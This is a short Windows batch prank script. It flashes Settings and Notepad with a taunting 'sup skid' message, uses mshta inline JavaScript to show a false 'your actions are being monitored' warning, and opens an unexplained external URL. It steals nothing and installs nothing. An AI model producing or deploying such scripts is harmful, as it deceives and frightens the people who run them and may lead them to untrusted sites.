@echo off
start "" ms-settings:
timeout /t 2 /nobreak
taskkill /f /im SystemSettings.exe

echo sup skid > temp.txt
start "" notepad temp.txt
timeout /t 2 /nobreak
del temp.txt
taskkill /f /im notepad.exe

mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('WARNING! Your actions are being monitored.\n\nChoose an option:\n\n1. OK\n2. Hide', 7, 'WARNING', 36);close()"

start "" https://stonks.boats/film.php?id=SLUQ85.t
timeout /t 2 /nobreak

exit

